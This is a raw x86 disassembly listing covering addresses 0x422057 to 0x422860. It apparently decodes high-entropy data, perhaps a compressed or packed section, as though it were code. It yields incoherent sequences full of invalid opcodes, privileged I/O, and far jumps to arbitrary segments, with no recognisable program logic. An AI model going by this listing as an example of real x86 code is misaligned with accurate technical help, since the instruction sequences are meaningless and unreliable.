  422057:	jae    0x4220c6
  422059:	pop    edx
  42205a:	stos   DWORD PTR es:[edi],eax
  42205b:	sahf   
  42205c:	loop   0x42201e
  42205e:	je     0x4220c6
  422060:	in     eax,dx
  422061:	pushf  
  422062:	loop   0x42208f
  422064:	js     0x422073
  422066:	or     bh,bl
  422068:	lock sub ch,0xf5
  42206c:	mov    DWORD PTR [edx+eiz*2],esp
  42206f:	in     eax,dx
  422070:	test   al,0xfa
  422072:	(bad)  
  422073:	pop    ss
  422074:	jmp    0x9e1a4a66
  422079:	lahf   
  42207a:	fcomp  QWORD PTR [edi-0x25]
  42207d:	sub    al,0xb8
  42207f:	or     DWORD PTR [eax-0x33],ecx
  422082:	xor    ch,0x7a
  422085:	pop    edi
  422086:	xchg   ecx,eax
  422087:	retf   
  422088:	add    al,0x3c
  42208a:	or     DWORD PTR [eax],esp
  42208c:	loopne 0x422090
  42208e:	push   0x74
  422090:	bound  esi,QWORD PTR [ecx]
  422092:	xchg   edi,eax
  422093:	inc    edi
  422094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422095:	out    0x9c,eax
  422097:	mov    al,ds:0x46837780
  42209c:	je     0x42210c
  42209e:	pop    es
  42209f:	shl    DWORD PTR [ebx-0x4e4a9c8b],0xfe
  4220a6:	pop    esp
  4220a7:	or     al,al
  4220a9:	mov    DWORD PTR [esi+0x79076a8f],eax
  4220af:	adc    dl,dl
  4220b1:	xchg   dh,ah
  4220b3:	adc    DWORD PTR [esi],ebp
  4220b5:	dec    ecx
  4220b6:	mov    ch,0xa6
  4220b8:	mov    edi,0x52730597
  4220bd:	jle    0x42206c
  4220bf:	repz imul edi,DWORD PTR [edx-0x2ae993a9],0x5e
  4220c7:	nop
  4220c8:	loope  0x4220ae
  4220ca:	push   esi
  4220cb:	pop    ebp
  4220cc:	retf   0x9692
  4220cf:	inc    edi
  4220d0:	jp     0x42207a
  4220d2:	mov    bl,0xc9
  4220d4:	mov    BYTE PTR [ebx+0x6934e5a7],bl
  4220da:	mov    edx,0x52fbb155
  4220df:	pusha  
  4220e0:	test   BYTE PTR [ecx+0x60],ah
  4220e3:	mov    cl,0xac
  4220e5:	pop    ecx
  4220e6:	dec    ecx
  4220e7:	ds popf 
  4220e9:	cli    
  4220ea:	sub    cl,BYTE PTR [ecx-0x5f575909]
  4220f0:	test   al,0x7b
  4220f2:	xchg   esp,eax
  4220f3:	and    eax,0xaa77f946
  4220f8:	cmp    DWORD PTR [esp+esi*2],0xe25a9d91
  4220ff:	gs or  eax,0x255e6e9e
  422105:	(bad)  
  422106:	mov    edi,0x37d9c229
  42210b:	mov    ebx,0x29940a01
  422110:	sbb    al,0x40
  422112:	xor    eax,0xdb65c789
  422117:	mov    ch,0x13
  422119:	pop    eax
  42211a:	call   0x1d15:0xf1e4e76e
  422121:	inc    BYTE PTR [ecx+0x6]
  422124:	or     al,0xc9
  422126:	jnp    0x422156
  422128:	test   al,0x6b
  42212a:	jnp    0x4220d5
  42212c:	mov    BYTE PTR [eax+ebx*1+0x18d8852e],dl
  422133:	cli    
  422134:	bound  esi,QWORD PTR [edi+0x3202e30e]
  42213a:	lds    esi,FWORD PTR [edi+eiz*8-0x44]
  42213e:	int    0xa2
  422140:	xchg   ebx,eax
  422141:	push   edi
  422142:	mov    dl,0x1
  422144:	add    eax,0x801efb1b
  422149:	add    eax,0x91cb05ba
  42214e:	test   al,0x6c
  422150:	inc    ebp
  422151:	xchg   edx,eax
  422152:	push   cs
  422153:	loopne 0x4221a1
  422155:	add    BYTE PTR [edi+0x55ca73b8],dh
  42215b:	push   esp
  42215c:	mov    ds:0x6b3f3481,al
  422161:	sub    eax,0xfc372455
  422166:	sbb    al,0xee
  422168:	adc    cl,BYTE PTR [ecx+ecx*4]
  42216b:	inc    edi
  42216c:	aad    0x90
  42216e:	mov    ds:0x150b1d46,eax
  422173:	push   edx
  422174:	mov    edx,0xa715646e
  422179:	and    dl,bh
  42217b:	sbb    eax,0x1a486b7c
  422180:	mov    cl,0x6d
  422182:	out    dx,al
  422183:	popa   
  422184:	cdq    
  422185:	dec    esp
  422186:	push   es
  422187:	outs   dx,DWORD PTR ds:[esi]
  422188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422189:	jno    0x4221a1
  42218b:	frstor [ebx]
  42218d:	sbb    eax,DWORD PTR [ecx+0x52390c13]
  422193:	push   esp
  422194:	pop    ebp
  422195:	retf   
  422196:	add    al,0xe3
  422198:	sbb    ebx,DWORD PTR [ebp+0x5d52c0d7]
  42219e:	retf   
  42219f:	mov    ebp,0x5675341c
  4221a4:	test   DWORD PTR [edi-0x4c],ebp
  4221a7:	sub    al,0xf7
  4221a9:	shl    edx,cl
  4221ab:	test   al,0xdd
  4221ad:	je     0x42218a
  4221af:	es loop 0x42214a
  4221b2:	out    dx,al
  4221b3:	xchg   ebp,eax
  4221b4:	es jmp 0x422221
  4221b7:	lods   al,BYTE PTR ss:[esi]
  4221b9:	icebp  
  4221ba:	div    DWORD PTR [eax]
  4221bc:	outs   dx,DWORD PTR ds:[esi]
  4221bd:	xlat   BYTE PTR ds:[ebx]
  4221be:	and    bh,BYTE PTR ds:0x50b760d
  4221c4:	outs   dx,BYTE PTR ds:[esi]
  4221c5:	xchg   ebp,esi
  4221c7:	xchg   DWORD PTR [ebp-0x481e9ed],ecx
  4221cd:	mov    fs,WORD PTR [edi-0x50]
  4221d0:	(bad)  
  4221d2:	mov    ds:0xe59576d8,al
  4221d7:	jmp    0xe2d3:0x40814c74
  4221de:	(bad)
  4221e1:	mov    ebx,0xaabc4dff
  4221e6:	in     eax,0xbd
  4221e8:	and    dh,BYTE PTR [edi-0x61da9fdb]
  4221ee:	push   ebp
  4221ef:	cmp    ah,BYTE PTR es:[edx+0x5e9af83e]
  4221f6:	sti    
  4221f7:	push   cs
  4221f8:	cld    
  4221f9:	bound  ebx,QWORD PTR [ecx+0xf]
  4221fc:	call   0xc3da:0x65f6e27a
  422203:	cmp    BYTE PTR [edx+edi*2+0x54],dl
  422207:	jns    0x4221d3
  422209:	sub    eax,0x3be7f119
  42220e:	xchg   al,al
  422210:	lahf   
  422211:	inc    edx
  422212:	jle    0x4221d1
  422214:	rol    DWORD PTR [edi+0x44],1
  422217:	fnstcw WORD PTR [esi+edi*1-0xc]
  42221b:	mov    al,ds:0xbbe6ef6f
  422220:	adc    DWORD PTR [esi],ecx
  422222:	into   
  422223:	add    BYTE PTR [eax+0x463a0846],0x5c
  42222a:	mov    ebp,0xdd82d935
  42222f:	pop    ss
  422230:	fisubr WORD PTR [esi+0x7f]
  422233:	sbb    al,0xb
  422235:	inc    ecx
  422236:	sub    al,0xd8
  422238:	cdq    
  422239:	mov    bh,0x6b
  42223b:	fild   WORD PTR [ecx-0x78]
  42223e:	loopne 0x4222a9
  422240:	mov    edx,0x8ac11b3f
  422245:	xchg   DWORD PTR [esi+eiz*4-0x567616f2],esi
  42224c:	inc    esp
  42224d:	cmp    DWORD PTR [edx-0x4f],esi
  422250:	scas   al,BYTE PTR es:[edi]
  422251:	loop   0x42229b
  422253:	pop    ebp
  422254:	push   es
  422255:	scas   al,BYTE PTR es:[edi]
  422256:	shl    BYTE PTR ds:0x35199df7,0x23
  42225d:	adc    al,0xc0
  42225f:	jns    0x4222de
  422261:	(bad)
  422265:	loopne 0x422257
  422267:	mov    dl,0x39
  422269:	stos   BYTE PTR es:[edi],al
  42226a:	jno    0x4222e2
  42226c:	fimul  DWORD PTR [ecx-0x16]
  42226f:	mov    BYTE PTR [eax-0x2009df2],0x4d
  422276:	outs   dx,DWORD PTR ds:[esi]
  422277:	mov    eax,ds:0x16bd7247
  42227c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42227d:	stos   DWORD PTR es:[edi],eax
  42227e:	xlat   BYTE PTR ds:[ebx]
  42227f:	dec    edx
  422280:	jne    0x422301
  422282:	test   al,0x30
  422284:	call   0xb195:0xcfaa1bd1
  42228b:	mov    esp,DWORD PTR [edi+0x881b6b8]
  422291:	cmp    edi,DWORD PTR [ecx+0x15]
  422294:	ja     0x4222a6
  422296:	xchg   BYTE PTR [edi],bh
  422298:	in     eax,0x25
  42229a:	ins    BYTE PTR es:[edi],dx
  42229b:	mov    al,ds:0x7961b0ed
  4222a0:	or     al,0x5a
  4222a2:	mov    ebp,0x0
  4222a7:	add    BYTE PTR [eax],al
  4222a9:	add    BYTE PTR [edx+0x44],al
  4222ac:	inc    ebx
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0xa6ef7dc,eax
  4222b9:	pop    eax
  4222ba:	pop    eax
  4222bb:	mov    cl,0x1
  4222bd:	add    BYTE PTR [ecx-0x54fffffa],al
  4222c3:	ins    BYTE PTR es:[edi],dx
  4222c4:	xor    DWORD PTR [eax+0x6d092701],edx
  4222ca:	push   0xffffffbc
  4222cc:	imul   eax,DWORD PTR [ebp+eiz*1-0x73e41375],0xbd91fe7e
  4222d7:	pop    ebp
  4222d8:	xlat   BYTE PTR gs:[ebx]
  4222da:	mov    ebp,0xb6c7bf9a
  4222df:	cdq    
  4222e0:	mov    edi,0x1d6fde34
  4222e5:	cmp    al,0x36
  4222e7:	lods   al,BYTE PTR ds:[esi]
  4222e8:	jno    0x4222d0
  4222ea:	test   DWORD PTR ss:[edi+0x63],esi
  4222ee:	es mov dl,0x7
  4222f1:	fst    QWORD PTR [ebx-0x38ad305c]
  4222f7:	and    BYTE PTR [ebx+0x2f456fa6],0x8f
  4222fe:	mov    ecx,0x6b842434
  422303:	inc    edi
  422304:	jnp    0x42236b
  422306:	aad    0x99
  422308:	mov    cl,0x14
  42230a:	fldz   
  42230c:	sbb    al,0x0
  42230e:	aad    0x8
  422310:	jge    0x422339
  422312:	cmp    edi,DWORD PTR [edx]
  422314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422315:	fist   WORD PTR [ecx]
  422317:	push   edx
  422318:	adc    BYTE PTR [ecx-0x3b],bh
  42231b:	adc    BYTE PTR [ebp-0x15279733],dl
  422321:	jmp    0xaea9600c
  422326:	in     eax,0xed
  422328:	pusha  
  422329:	test   eax,0x9ec65bb7
  42232e:	mov    eax,0x17f0d1a5
  422333:	lods   al,BYTE PTR ds:[esi]
  422334:	push   ebx
  422335:	jno    0x4222fa
  422337:	and    bl,0x45
  42233a:	push   ds
  42233b:	out    0x30,al
  42233d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233e:	push   ss
  42233f:	syscall 
  422341:	add    BYTE PTR [ebp+0x5dc7cf70],cl
  422347:	mov    esi,0x17a6ae79
  42234c:	dec    edx
  42234e:	fcomp  QWORD PTR [edx]
  422350:	ret    0x40
  422353:	push   edx
  422354:	sbb    al,0xc0
  422356:	push   ebx
  422357:	sub    ecx,ebx
  422359:	rol    BYTE PTR [ebp-0x38b9e9db],0xe2
  422360:	sub    edi,DWORD PTR [edi-0x2845a59a]
  422366:	mov    esp,0x2dfe08fb
  42236b:	xchg   edi,eax
  42236c:	cmp    al,0x94
  42236e:	pop    esi
  42236f:	mov    ebp,0xebecf381
  422374:	fisttp QWORD PTR [esi-0x52f95b74]
  42237a:	pop    edi
  42237b:	mov    ecx,0xc9b5f927
  422380:	sti    
  422381:	retf   
  422382:	mov    WORD PTR [ebp-0x59],?
  422385:	(bad)  
  422387:	xor    bh,ch
  422389:	mov    ebp,0xc310490c
  42238e:	aad    0x34
  422390:	or     DWORD PTR [ebp+0x7a],ecx
  422393:	das    
  422394:	(bad)  
  422395:	pushf  
  422396:	scas   eax,DWORD PTR es:[edi]
  422397:	enter  0xdd2b,0x7f
  42239b:	daa    
  42239c:	xchg   esp,eax
  42239d:	pop    esp
  42239e:	test   al,0xb0
  4223a0:	mov    eax,0x3dada3d2
  4223a5:	mov    eax,DWORD PTR [esp+ebp*4+0x42]
  4223a9:	jle    0x4223db
  4223ab:	inc    esi
  4223ac:	je     0x4223d9
  4223ae:	cmp    DWORD PTR [edx-0xbe3a4d],edi
  4223b4:	mov    cl,0x41
  4223b6:	add    eax,DWORD PTR [ecx-0x50]
  4223b9:	retf   
  4223ba:	jae    0x422400
  4223bc:	and    DWORD PTR [ebp-0x30],ebp
  4223bf:	adc    dl,ah
  4223c1:	retf   
  4223c2:	jnp    0x4223d2
  4223c4:	xchg   edx,eax
  4223c5:	mov    BYTE PTR ds:0xa3763ca4,bh
  4223cb:	dec    esi
  4223cc:	inc    eax
  4223cd:	lods   al,BYTE PTR ds:[esi]
  4223ce:	out    0x11,al
  4223d0:	or     bh,BYTE PTR [esi+0x7196f77d]
  4223d6:	loop   0x422387
  4223d8:	dec    eax
  4223d9:	jbe    0x42238f
  4223db:	rcl    BYTE PTR [esp+eiz*2],0x3e
  4223df:	cli    
  4223e0:	vmread DWORD PTR [eax],edx
  4223e3:	lods   al,BYTE PTR ds:[esi]
  4223e4:	xchg   edi,eax
  4223e5:	jns    0x4223d7
  4223e7:	push   eax
  4223e8:	std    
  4223e9:	retf   
  4223ea:	push   ecx
  4223eb:	ret    0x571d
  4223ee:	mov    bl,0x5b
  4223f0:	cli    
  4223f1:	sbb    al,0x51
  4223f3:	jne    0x422438
  4223f5:	nop
  4223f6:	call   0x4877:0x1afc
  4223fc:	xchg   edi,eax
  4223fd:	mov    dl,0x36
  4223ff:	sub    ecx,DWORD PTR [eax+0xc]
  422402:	sbb    eax,edx
  422404:	arpl   bx,ax
  422406:	push   edi
  422407:	test   DWORD PTR [esi+0x57],ecx
  42240a:	fidivr WORD PTR [edi-0x4baacb8a]
  422410:	push   ds
  422411:	dec    esp
  422412:	in     al,0x83
  422414:	bswap  esp
  422416:	sbb    BYTE PTR [edx+0x36],al
  422419:	xchg   esi,eax
  42241a:	jo     0x422411
  42241c:	mov    al,0x53
  42241e:	(bad)  
  42241f:	push   esp
  422420:	or     edi,DWORD PTR [esp+eiz*2+0xdd411e4]
  422427:	popa   
  422428:	ret    
  422429:	loope  0x422484
  42242b:	fsub   QWORD PTR [edx-0x2a739f26]
  422431:	mov    ebp,0xed2268d
  422436:	idiv   BYTE PTR [ecx+0x7a375b10]
  42243c:	sub    eax,eax
  42243e:	data16 sub al,0x29
  422441:	(bad)
  422444:	push   0x5a
  422446:	cmp    al,BYTE PTR [ebx]
  422448:	pusha  
  422449:	push   es
  42244a:	dec    ebx
  42244b:	in     eax,0x16
  42244d:	adc    al,0x42
  42244f:	inc    esi
  422450:	inc    ebx
  422451:	ss inc esi
  422453:	mov    edi,0xf47224cd
  422458:	out    0xf4,eax
  42245a:	cmp    ecx,DWORD PTR [eax-0x6]
  42245d:	or     BYTE PTR [ebx-0x2e3d215f],bh
  422463:	inc    ecx
  422464:	test   al,0xef
  422466:	pop    ss
  422467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422468:	ss (bad) 
  42246a:	or     al,0xb8
  42246c:	not    DWORD PTR [edi]
  42246e:	jp     0x422463
  422470:	enter  0x5ade,0x7a
  422474:	mov    bl,0xc3
  422476:	jg     0x422447
  422478:	push   ebx
  422479:	sbb    ch,BYTE PTR [esi]
  42247b:	neg    BYTE PTR [eax]
  42247d:	inc    ecx
  42247e:	repz (bad) 
  422480:	fstp   st(0)
  422482:	or     edi,DWORD PTR [esi-0x55]
  422485:	sti    
  422486:	jo     0x422434
  422488:	idiv   DWORD PTR [eax+0x72]
  42248b:	ds call 0x93a0:0x34220154
  422493:	loop   0x422427
  422495:	pop    ebp
  422496:	dec    edi
  422497:	fnstsw ax
  422499:	push   ebx
  42249a:	repnz jmp 0x59ee:0xaecdf9cd
  4224a2:	mov    esi,0x13319c86
  4224a7:	out    dx,al
  4224a8:	pop    edx
  4224a9:	jmp    0x422439
  4224ab:	jbe    0x4224f1
  4224ad:	lea    ecx,[ebp+0x30]
  4224b0:	add    DWORD PTR [ebx-0x250ff335],edx
  4224b6:	or     bh,0x19
  4224b9:	add    bl,al
  4224bb:	fs push esi
  4224bd:	mov    ah,0x2a
  4224bf:	pop    es
  4224c0:	or     DWORD PTR [edx+eiz*1],esp
  4224c3:	adc    al,0xe7
  4224c5:	sub    ebx,DWORD PTR [ebx+eax*1]
  4224c8:	std    
  4224c9:	inc    edi
  4224ca:	(bad)  
  4224cb:	into   
  4224cc:	add    eax,0x34794b10
  4224d1:	dec    edi
  4224d2:	xlat   BYTE PTR ds:[ebx]
  4224d3:	sub    ah,BYTE PTR [ecx+0xe]
  4224d6:	inc    ecx
  4224d7:	mov    ah,BYTE PTR [eax+0x2a]
  4224da:	inc    edi
  4224db:	mov    cl,BYTE PTR [edx]
  4224dd:	jge    0x422502
  4224df:	shr    DWORD PTR [ebx+edi*1-0x1030e98d],cl
  4224e6:	(bad)  
  4224e7:	jl     0x422484
  4224e9:	(bad)  
  4224ea:	cmp    BYTE PTR [eax],ah
  4224ec:	(bad)  
  4224ed:	int3   
  4224ee:	daa    
  4224ef:	push   eax
  4224f0:	mov    eax,ds:0x78bae70f
  4224f5:	sub    ecx,DWORD PTR [ebx-0x3f]
  4224f8:	xchg   al,ch
  4224fa:	inc    edx
  4224fb:	cmp    BYTE PTR [edi+eax*4-0x78],bh
  4224ff:	pop    esp
  422500:	push   edi
  422501:	adc    DWORD PTR [edx],0x5d
  422504:	and    eax,DWORD PTR [edx-0x32]
  422507:	or     al,0x20
  422509:	fild   QWORD PTR [ecx+eiz*4+0x2860d25a]
  422510:	jns    0x4224f8
  422512:	xor    BYTE PTR [ecx],dh
  422514:	and    ebp,esp
  422516:	xchg   DWORD PTR [edi+0x19a12073],ebp
  42251c:	mov    ch,0xc8
  42251e:	mov    eax,0xa8616cd0
  422523:	push   esp
  422524:	or     DWORD PTR [ebx+0x1d],esi
  422527:	push   edx
  422528:	cmp    bh,0x74
  42252b:	ret    
  42252c:	inc    edi
  42252d:	ss popa 
  42252f:	out    0x82,eax
  422531:	(bad)  
  422532:	fcom   DWORD PTR [eax+0x62]
  422535:	shr    BYTE PTR [ecx+0x3281d5f4],0x58
  42253c:	jnp    0x42251f
  42253e:	retf   
  42253f:	test   eax,0x42467110
  422544:	shl    BYTE PTR [edx+0x3b712384],0x50
  42254b:	movntq (bad),mm0
  42254c:	out    0xc2,eax
  42254e:	out    0x78,eax
  422550:	sbb    esp,DWORD PTR [edi]
  422552:	lods   al,BYTE PTR ds:[si]
  422554:	mov    DWORD PTR [edi+0x293d8757],eax
  42255a:	popa   
  42255b:	(bad)  
  42255c:	sahf   
  42255d:	jno    0x42250e
  42255f:	sub    eax,ecx
  422561:	mov    esi,0x5115ccc5
  422566:	push   esp
  422567:	cmp    BYTE PTR [eax+0x3e],al
  42256a:	xchg   edi,eax
  42256b:	out    0x5a,al
  42256d:	push   ebx
  42256e:	and    al,0x5c
  422570:	mov    ecx,0xd4e4d440
  422575:	add    al,0xd0
  422577:	outs   dx,DWORD PTR ds:[esi]
  422578:	nop
  422579:	adc    bh,BYTE PTR [edi-0x26d72eb8]
  42257f:	dec    esi
  422580:	leave  
  422581:	addr16 mov dl,0x1c
  422584:	xor    DWORD PTR [esi-0x2a92957f],esp
  42258a:	push   eax
  42258b:	mov    ds:0xc59f586f,eax
  422590:	sbb    ebx,DWORD PTR [edi+eax*8+0x173015ac]
  422597:	jle    0x4225a9
  422599:	je     0x422569
  42259b:	iret   
  42259c:	mov    ch,0xca
  42259e:	add    bl,BYTE PTR [edx+0x7ec804a]
  4225a4:	clc    
  4225a5:	mov    DWORD PTR [ecx-0x13],esp
  4225a8:	nop
  4225a9:	jmp    0xee5a7450
  4225ae:	enter  0x325f,0x1c
  4225b2:	pop    ebp
  4225b3:	sbb    cl,bh
  4225b5:	xchg   edx,eax
  4225b6:	dec    edi
  4225b7:	inc    eax
  4225b8:	mov    edi,0xe66d3ea
  4225bd:	push   edx
  4225be:	jnp    0x422572
  4225c0:	loopne 0x422560
  4225c2:	retf   
  4225c3:	daa    
  4225c4:	stos   BYTE PTR es:[edi],al
  4225c5:	mov    edx,0x76e2fb77
  4225ca:	(bad)  
  4225cc:	pop    ebx
  4225cd:	pop    ss
  4225ce:	pop    esp
  4225cf:	xchg   ebx,eax
  4225d0:	adc    eax,DWORD PTR [eax+ebx*8+0x25]
  4225d4:	loopne 0x4225f5
  4225d6:	shl    BYTE PTR [ebx+0x6b],cl
  4225d9:	and    DWORD PTR [edi+0x4f17c171],ecx
  4225df:	dec    ecx
  4225e0:	ins    DWORD PTR es:[edi],dx
  4225e1:	push   eax
  4225e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e3:	cmp    DWORD PTR ds:0x261d12b1,esi
  4225e9:	and    DWORD PTR [edi+0x1d77ac77],0x1de09db3
  4225f3:	pusha  
  4225f4:	(bad)
  4225f7:	shl    DWORD PTR [esi],cl
  4225f9:	or     eax,0x72664031
  4225fe:	pop    es
  4225ff:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  422601:	jl     0x4225b8
  422603:	xchg   esp,esp
  422605:	add    DWORD PTR [esp+esi*4-0x1b62e0b],edx
  42260c:	shr    DWORD PTR [eax+0x4c],cl
  42260f:	cmc    
  422610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422611:	idiv   DWORD PTR [ebp*1-0x348f45b1]
  422618:	fwait
  422619:	push   cs
  42261a:	ret    0x8a6a
  42261d:	rcr    BYTE PTR [ecx],cl
  42261f:	mov    esi,0xa0897c5
  422624:	mov    ebx,0xf93f2ff3
  422629:	fist   DWORD PTR [ecx+0x59]
  42262c:	pop    ss
  42262d:	and    BYTE PTR [ecx+0x77d66fe6],ah
  422633:	clc    
  422634:	push   esi
  422635:	dec    eax
  422636:	ror    al,1
  422638:	xchg   ecx,eax
  422639:	mov    esp,0xe7c507eb
  42263e:	int    0x48
  422640:	and    DWORD PTR [ecx],ecx
  422642:	mov    ebp,0xb546716b
  422647:	jne    0x42267b
  422649:	dec    DWORD PTR [eax-0x2b]
  42264c:	xchg   edi,eax
  42264d:	ins    BYTE PTR es:[edi],dx
  42264e:	jno    0x42263c
  422650:	pop    edx
  422651:	outs   dx,BYTE PTR ds:[esi]
  422652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422653:	rcr    edi,cl
  422655:	fcom   QWORD PTR [ebp+0x48]
  422658:	ins    BYTE PTR es:[edi],dx
  422659:	(bad)  
  42265a:	enter  0x7aaa,0xe5
  42265e:	int3   
  42265f:	das    
  422660:	ja     0x42262c
  422662:	sti    
  422663:	pop    edx
  422664:	jge    0x42260d
  422666:	cdq    
  422667:	enter  0x32c4,0x21
  42266b:	rcl    DWORD PTR [esi],1
  42266d:	mov    ds:0xa224e6db,al
  422672:	stos   BYTE PTR es:[edi],al
  422673:	push   ebp
  422674:	push   esi
  422675:	test   BYTE PTR [esi+0x106c7867],0xb9
  42267c:	add    al,0x30
  42267e:	inc    esi
  42267f:	sub    DWORD PTR ds:0xf8e2d9b5,edx
  422685:	inc    esi
  422686:	xchg   esi,eax
  422687:	add    al,0x5c
  422689:	(bad)  
  42268b:	pop    es
  42268c:	sbb    esp,DWORD PTR [ecx-0xe24e46d]
  422692:	push   0xffffffc0
  422694:	xchg   ebp,eax
  422695:	jo     0x4226a3
  422697:	sahf   
  422698:	jno    0x4226dd
  42269a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42269b:	push   ss
  42269c:	cmp    BYTE PTR [eax-0x6c],dh
  42269f:	or     BYTE PTR [ebp+0x5eed6558],al
  4226a5:	mov    dh,0xee
  4226a7:	cmp    al,0x4
  4226a9:	xor    eax,ebx
  4226ab:	nop
  4226ac:	or     eax,0x3c7a0ffc
  4226b1:	xchg   esp,eax
  4226b2:	push   esi
  4226b3:	sbb    eax,0xdd032088
  4226b8:	rcl    DWORD PTR [esi+0x572dcc85],cl
  4226be:	and    dh,bh
  4226c0:	scas   al,BYTE PTR es:[edi]
  4226c1:	bound  ebx,QWORD PTR [eax]
  4226c3:	add    eax,0xc87ace1e
  4226c8:	fisttp DWORD PTR [ecx-0x46]
  4226cb:	cmp    BYTE PTR [edi-0xe8e109c],0x9
  4226d2:	retf   
  4226d3:	dec    ecx
  4226d4:	lea    ebx,[ebp+0x1984ee39]
  4226da:	jge    0x4226c5
  4226dc:	clc    
  4226dd:	lahf   
  4226de:	cdq    
  4226df:	cmp    ebp,DWORD PTR [ecx+0x66]
  4226e2:	outs   dx,DWORD PTR ds:[esi]
  4226e3:	and    BYTE PTR [esi-0x5b544558],0xa9
  4226ea:	inc    ebx
  4226eb:	cld    
  4226ec:	inc    esp
  4226ed:	jns    0x422761
  4226ef:	test   cl,0x86
  4226f2:	push   ebx
  4226f3:	pop    eax
  4226f4:	lock pop eax
  4226f6:	xchg   ebx,eax
  4226f7:	fstp   st(1)
  4226f9:	in     eax,dx
  4226fa:	push   0x2089692b
  4226ff:	jnp    0x422719
  422701:	out    dx,al
  422702:	add    esp,ebx
  422704:	jg     0x42271f
  422706:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  422708:	das    
  422709:	cmp    al,0x78
  42270b:	(bad)
  42270e:	mov    ecx,0xf0b7268f
  422713:	inc    eax
  422714:	stc    
  422715:	adc    al,0x17
  422717:	lds    ebx,FWORD PTR [ecx]
  422719:	lahf   
  42271a:	stos   DWORD PTR es:[edi],eax
  42271b:	jb     0x42279a
  42271d:	add    eax,0xf6fca11e
  422722:	mul    BYTE PTR [eax+edx*8-0x13772cc8]
  422729:	mov    eax,ds:0xd903291a
  42272e:	mov    ebp,0x8f825f6f
  422733:	push   edx
  422734:	inc    edx
  422735:	scas   al,BYTE PTR es:[edi]
  422736:	jg     0x422713
  422738:	lea    ebx,[ecx+eax*1-0x5d88c7b7]
  42273f:	fmul   QWORD PTR [esi-0x188db746]
  422745:	push   ebx
  422746:	lods   eax,DWORD PTR ds:[esi]
  422747:	pop    esp
  422748:	and    edi,0xe083565a
  42274e:	cmp    DWORD PTR ds:0x67e4c94a,eax
  422754:	inc    edi
  422755:	and    DWORD PTR [edi],ebp
  422757:	sub    eax,0x88511850
  42275c:	and    al,BYTE PTR [ecx-0x315a567f]
  422762:	sub    eax,0x7532518
  422767:	cld    
  422768:	mov    al,0x73
  42276a:	rcl    BYTE PTR [eax-0x1c73dc12],0x3a
  422771:	cmp    al,0xa5
  422773:	fisubr DWORD PTR [ebx]
  422775:	xlat   BYTE PTR ds:[ebx]
  422776:	pop    ecx
  422777:	push   0x4bbafdb
  42277c:	icebp  
  42277d:	mov    eax,ds:0xdde9d476
  422782:	ins    DWORD PTR es:[edi],dx
  422783:	xor    DWORD PTR [eax-0x7b9f3b4a],edi
  422789:	mov    ds:0x8af585b,al
  42278e:	lock retf 0x308d
  422792:	and    al,0x42
  422794:	into   
  422795:	dec    ebp
  422796:	out    dx,eax
  422797:	mov    al,0x32
  422799:	out    0xa,al
  42279b:	mov    esi,DWORD PTR [esi+0x6b]
  42279e:	stos   BYTE PTR es:[edi],al
  42279f:	cmp    eax,0x21e45188
  4227a4:	jg     0x4227bc
  4227a6:	jmp    0x479c:0x9a763eb1
  4227ad:	int3   
  4227ae:	sub    al,0xf9
  4227b0:	mov    al,ds:0xf060c387
  4227b5:	cld    
  4227b6:	cmp    bl,BYTE PTR [esi-0x3d894df5]
  4227bc:	les    ebp,FWORD PTR [ecx-0xd39b2cb]
  4227c2:	stos   DWORD PTR es:[edi],eax
  4227c3:	mov    esi,0x449530e1
  4227c8:	lods   eax,DWORD PTR ds:[esi]
  4227c9:	mov    ebp,0x26773d3b
  4227ce:	cmc    
  4227cf:	(bad)  [ebx+0x34]
  4227d2:	xchg   esp,eax
  4227d3:	fisubr DWORD PTR [eax+0x10]
  4227d6:	jnp    0xbd88ce1f
  4227dc:	call   0xee76:0xb6e3b8c
  4227e3:	jl     0x422815
  4227e5:	mov    ah,0xf1
  4227e7:	dec    esp
  4227e8:	ror    BYTE PTR [edx],1
  4227ea:	mov    ebp,DWORD PTR [ebx+eiz*4]
  4227ed:	cmp    BYTE PTR [edi+0x7d3ee99],cl
  4227f3:	out    0xa4,eax
  4227f5:	dec    ebx
  4227f6:	int    0x1e
  4227f8:	retf   0x8181
  4227fb:	cmp    ch,ch
  4227fd:	in     al,0x86
  4227ff:	mov    cl,0xd3
  422801:	xchg   BYTE PTR [esi-0x56b24d72],al
  422807:	js     0x422855
  422809:	into   
  42280a:	dec    ebp
  42280b:	arpl   WORD PTR [ecx+0x7ec39573],si
  422811:	hlt    
  422812:	mov    DWORD PTR [edi+eax*1],ecx
  422815:	mov    edx,0xcf6412e5
  42281a:	cwde   
  42281b:	(bad)  [esi+0x1f]
  42281e:	scas   eax,DWORD PTR es:[edi]
  42281f:	pop    eax
  422820:	ins    DWORD PTR es:[edi],dx
  422821:	mov    bl,0x34
  422823:	out    0x11,eax
  422825:	rcr    DWORD PTR [ecx+0x17],1
  422828:	mov    dx,0xf75c
  42282c:	gs push edx
  42282e:	nop
  42282f:	loope  0x422848
  422831:	shl    DWORD PTR [esi-0x22270b35],0x7e
  422838:	fbstp  TBYTE PTR [eax+0x3991b9c6]
  42283e:	test   eax,0xa42dc1fe
  422843:	jno    0x4228a0
  422845:	mov    edi,0x25d66d4c
  42284a:	hlt    
  42284b:	js     0x4228be
  42284d:	cmp    DWORD PTR [esi-0x2],0x47
  422851:	fdivr  DWORD PTR [esp+esi*4-0x5439384e]
  422858:	jg     0x42286c
  42285a:	xchg   edx,eax
  42285b:	outs   dx,DWORD PTR ds:[esi]
  42285c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42285d:	and    BYTE PTR [esi-0x19],dh
  422860:	loopne 0x4228bb
